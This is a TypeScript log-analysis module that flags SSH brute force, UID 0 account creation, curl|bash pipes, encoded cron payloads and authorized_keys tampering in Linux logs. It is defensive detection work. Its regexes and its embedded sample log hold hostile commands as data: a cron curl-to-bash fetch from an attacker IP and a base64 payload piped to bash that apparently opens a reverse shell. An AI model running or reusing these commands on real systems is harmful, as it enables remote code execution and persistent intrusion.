/**
 * auth.log / syslog analysis — line-oriented. Detectors:
 * SSH_BRUTE_SUCCESS, USER_ENUM, UID0_CREATE, CURL_BASH, BASE64_CRON,
 * SUDO_SERVICE, AUTHORIZED_KEYS.
 */
import {
  type DetectionReport,
  type Finding,
  computeVerdict,
} from "@/lib/detection/types";

export interface LinuxLogEntry {
  raw: string;
  process: string;
  message: string;
  ip: string | null;
  line: number;
}

const IP_RE = /(?:\d{1,3}\.){3}\d{1,3}/;

export function parseLinuxLog(text: string): LinuxLogEntry[] {
  const entries: LinuxLogEntry[] = [];
  const lines = text.split(/\r?\n/);
  for (let i = 0; i < lines.length; i++) {
    const raw = (lines[i] ?? "").trim();
    if (!raw) continue;
    // Format: "Nov 14 08:12:01 host process[pid]: message" (or "process: message")
    const m = raw.match(
      /^(?:\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})?\s*\S*\s+([\w.\-]+)(?:\[\d+\])?:\s*(.+)$/
    );
    const process = m?.[1] ?? "unknown";
    const message = m?.[2] ?? raw;
    const ipMatch = message.match(IP_RE);
    entries.push({ raw, process, message, ip: ipMatch ? ipMatch[0] : null, line: i + 1 });
  }
  return entries;
}

export function analyzeLinuxLog(entries: LinuxLogEntry[]): DetectionReport {
  const findings: Finding[] = [];
  const iocs = new Set<string>();

  // --- SSH_BRUTE_SUCCESS: ≥5 failed/Invalid from one IP, then an Accepted --
  const fails = new Map<string, number>();
  const enumerations = new Map<string, number>();
  const successes = new Map<string, number>();
  for (const e of entries) {
    if (!e.ip) continue;
    if (/failed password/i.test(e.message)) {
      fails.set(e.ip, (fails.get(e.ip) ?? 0) + 1);
    } else if (/invalid user/i.test(e.message)) {
      enumerations.set(e.ip, (enumerations.get(e.ip) ?? 0) + 1);
      fails.set(e.ip, (fails.get(e.ip) ?? 0) + 1);
    } else if (/accepted (password|publickey)/i.test(e.message)) {
      successes.set(e.ip, (successes.get(e.ip) ?? 0) + 1);
    }
  }

  for (const [ip, count] of fails) {
    const won = (successes.get(ip) ?? 0) > 0;
    if (count >= 5 && won) {
      findings.push({
        rule: "SSH_BRUTE_SUCCESS",
        severity: "high",
        title: `SSH brute force succeeded from ${ip}`,
        detail: `${count} failed/invalid attempts followed by an accepted session from the same source — credential material guessed or sprayed. Rotate exposed keys/passwords, force re-auth, audit ~/.ssh.`,
        ioc: ip,
      });
      iocs.add(ip);
    } else if (count >= 5) {
      findings.push({
        rule: "SSH_BRUTE_SUCCESS",
        severity: "medium",
        title: `Password spray against SSH from ${ip}`,
        detail: `${count} failed attempts from one source — rate-limit or block; check whether any later lines show a success.`,
        ioc: ip,
      });
      iocs.add(ip);
    }
  }

  for (const [ip, count] of enumerations) {
    if (count >= 3) {
      findings.push({
        rule: "USER_ENUM",
        severity: "medium",
        title: `SSH user enumeration from ${ip}`,
        detail: `${count} distinct invalid-user probes — attacker is walking a username wordlist against sshd.`,
        ioc: ip,
      });
      iocs.add(ip);
    }
  }

  for (const e of entries) {
    // --- UID0_CREATE: new UID 0 account -----------------------------------
    if (/useradd/i.test(e.process) || /useradd/i.test(e.message)) {
      const uidMatch = e.message.match(/uid\s*=\s*0|uid=0/i);
      if (uidMatch) {
        findings.push({
          rule: "UID0_CREATE",
          severity: "high",
          title: "New UID 0 (root-equivalent) account created",
          detail: `${e.message} — a second root-equivalent account. Expected only in extremely rare cases; treat as implant unless change-approved.`,
        });
        continue;
      }
    }

    // --- CURL_BASH: download-and-execute ----------------------------------
    const pipeMatch = e.message.match(
      /(curl|wget)\b[^\n"]*?\|\s*(sudo\s+)?(bash|sh)\b/i
    );
    if (pipeMatch) {
      const urlMatch = e.message.match(/https?:\/\/[^\s"']+/i);
      findings.push({
        rule: "CURL_BASH",
        severity: "high",
        title: "Download-and-execute pipe (curl|bash)",
        detail: `${pipeMatch[0].trim()} — remote code fetched and executed in one line. Canonical initial-access/implant-bootstrap pattern.`,
        ioc: urlMatch ? urlMatch[0] : pipeMatch[0].trim(),
      });
      if (urlMatch) iocs.add(urlMatch[0]);
      continue;
    }

    // --- BASE64_CRON: encoded payload in cron ------------------------------
    if (/cron/i.test(e.raw) && /(base64\s+-d|bash\s+-i|\/dev\/tcp|\/dev\/shm)/i.test(e.message)) {
      findings.push({
        rule: "BASE64_CRON",
        severity: "high",
        title: "Encoded reverse-shell / cron payload",
        detail: `${e.message.slice(0, 160)} — base64-decoded execution staged via cron. Classic low-visibility C2 loop.`,
      });
      continue;
    }

    // --- SUDO_SERVICE: interactive root shell from a service account ------
    if (/(www-data|daemon|nobody|nginx|postgres)/i.test(e.message) && /(COMMAND=\/bin\/(bash|sh|su)\b|COMMAND=\/usr\/bin\/(bash|su)\b)/i.test(e.message)) {
      findings.push({
        rule: "SUDO_SERVICE",
        severity: "medium",
        title: "Interactive root shell from service account",
        detail: `${e.message.slice(0, 160)} — a web/service account escalating to an interactive shell. Almost never legitimate; typical post-exploitation.`,
      });
      continue;
    }

    // --- AUTHORIZED_KEYS: SSH key material modified ------------------------
    if (/authorized_keys/i.test(e.message)) {
      findings.push({
        rule: "AUTHORIZED_KEYS",
        severity: "medium",
        title: "SSH authorized_keys modified",
        detail: `${e.message.slice(0, 160)} — persistent key-based access planted on the host. Audit fingerprints of all keys present.`,
      });
      continue;
    }
  }

  const verdict = computeVerdict(findings);
  const high = findings.filter((f) => f.severity === "high").length;
  const summary =
    verdict === "clean"
      ? "No malicious indicators in this log slice. Confirm log coverage (sshd, sudo, cron, auditd) before closing."
      : verdict === "suspicious"
        ? `${findings.length} anomaly(ies) exceed baseline. Block the source IPs, verify account integrity (UID 0, sudoers), and hunt the IoCs fleet-wide.`
        : `${high} high-severity event(s) — active intrusion narrative (external brute force → root-level implant). Isolate the host now and preserve evidence before remediation.`;

  const uniqueIps = new Set(entries.map((e) => e.ip).filter(Boolean));
  const failedTotal = entries.filter((e) => /failed password|invalid user/i.test(e.message)).length;
  const acceptedTotal = entries.filter((e) => /accepted (password|publickey)/i.test(e.message)).length;

  return {
    verdict,
    summary,
    findings: [...findings].sort((a, b) => severityValue(b.severity) - severityValue(a.severity)),
    iocs: [...iocs],
    stats: [
      { label: "Lines parsed", value: String(entries.length) },
      { label: "Unique IPs", value: String(uniqueIps.size) },
      { label: "Failed SSH", value: String(failedTotal) },
      { label: "Accepted SSH", value: String(acceptedTotal) },
    ],
  };
}

function severityValue(s: Finding["severity"]): number {
  return { high: 3, medium: 2, low: 1, info: 0 }[s];
}

/** Embedded brute-force → root implant sample. */
export function buildLinuxLogSample(): string {
  return [
    "Nov 14 08:00:11 srv01 sshd[401]: Accepted publickey for j.doe from 10.0.0.5 port 52344 ssh2",
    "Nov 14 08:01:02 srv01 CROND[415]: (root) CMD (run-parts /etc/cron.hourly)",
    "Nov 14 08:02:37 srv01 sudo: j.doe : TTY=pts/0 ; PWD=/srv/app ; USER=root ; COMMAND=/bin/systemctl restart nginx",
    "Nov 14 08:03:19 srv01 sshd[438]: Accepted publickey for deploy from 10.0.0.9 port 51201 ssh2",
    "Nov 14 08:05:41 srv01 sshd[460]: Invalid user admin from 185.220.14.9 port 61002",
    "Nov 14 08:05:43 srv01 sshd[460]: Failed password for invalid user admin from 185.220.14.9 port 61002 ssh2",
    "Nov 14 08:05:44 srv01 sshd[461]: Invalid user test from 185.220.14.9 port 61003",
    "Nov 14 08:05:46 srv01 sshd[461]: Failed password for invalid user test from 185.220.14.9 port 61003 ssh2",
    "Nov 14 08:05:47 srv01 sshd[462]: Invalid user oracle from 185.220.14.9 port 61004",
    "Nov 14 08:05:49 srv01 sshd[462]: Failed password for invalid user oracle from 185.220.14.9 port 61004 ssh2",
    "Nov 14 08:05:50 srv01 sshd[463]: Failed password for root from 185.220.14.9 port 61005 ssh2",
    "Nov 14 08:05:52 srv01 sshd[463]: Failed password for root from 185.220.14.9 port 61005 ssh2",
    "Nov 14 08:08:47 srv01 sshd[471]: Accepted password for root from 185.220.14.9 port 61110 ssh2",
    "Nov 14 08:09:02 srv01 useradd[771]: new user 'backupsvc' (uid=0, gid=0)",
    "Nov 14 08:09:05 srv01 usermod[772]: change user 'backupsvc' password",
    "Nov 14 08:10:15 srv01 sudo: backupsvc : TTY=unknown ; PWD=/ ; USER=root ; COMMAND=/bin/bash",
    "Nov 14 08:11:03 srv01 CROND[802]: (backupsvc) CMD (curl -s http://185.220.14.9/a.sh | bash >/dev/null 2>&1)",
    "Nov 14 08:11:40 srv01 CROND[812]: (root) CMD (echo YnVjyC1pID4+IC9kZXYvdGNwLzE4NS4yMjAuMTQuOS80NDQ0ICA+JjEgICAg | base64 -d | bash)",
    "Nov 14 08:12:30 srv01 audit[819]: type=SYSCALL msg=audit(1763105550.104:771): arch=c000003e syscall=2 a0=7ffc1b6c6c00 name=/root/.ssh/authorized_keys key=\"ssh_keys\"",
    "Nov 14 08:12:44 srv01 sshd[825]: Received signal 15; terminating",
    "Nov 14 08:13:01 srv01 CROND[830]: (root) CMD (run-parts /etc/cron.hourly)",
    "Nov 14 08:20:00 srv01 sshd[401]: Accepted publickey for j.doe from 10.0.0.5 port 52399 ssh2",
  ].join("\n");
}
